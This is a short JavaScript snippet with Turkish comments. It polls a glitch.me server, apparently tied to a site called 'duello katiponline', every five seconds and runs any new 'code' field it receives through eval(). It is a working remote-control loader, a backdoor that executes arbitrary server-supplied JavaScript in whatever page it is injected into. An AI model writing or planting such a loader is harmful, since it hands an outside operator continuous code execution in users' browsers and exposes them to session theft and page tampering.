(function() {
    console.log('Script yüklendi!', 'Zaman:', new Date().toISOString());
    let lastTimestamp = null; // Son çalıştırılan kodun zaman damgasını sakla

    function fetchCode() {
        fetch('https://duello-katiponline-com.glitch.me/get-code')
            .then(response => {
                if (!response.ok) throw new Error('Sunucu yanıtı başarısız: ' + response.status);
                return response.json();
            })
            .then(data => {
                console.log('Kod alındı:', data.code, 'Timestamp:', data.timestamp, 'Zaman:', new Date().toISOString());
                if (data.code && (!lastTimestamp || data.timestamp > lastTimestamp)) { // Yeni kodsa çalıştır
                    try {
                        eval(data.code);
                        lastTimestamp = data.timestamp; // Son zaman damgasını güncelle
                    } catch (e) {
                        console.error('Kod çalıştırma hatası:', e.message, 'Zaman:', new Date().toISOString());
                    }
                } else {
                    console.log('Kod yeni değil, tekrar çalıştırılmadı:', data.code, 'Timestamp:', data.timestamp, 'Zaman:', new Date().toISOString());
                }
            })
            .catch(error => {
                console.error('Kod çekme hatası:', error.message, 'Zaman:', new Date().toISOString());
            })
            .finally(() => {
                setTimeout(fetchCode, 5000); // 5 saniye sonra tekrar kontrol et
            });
    }

    fetchCode();
})();
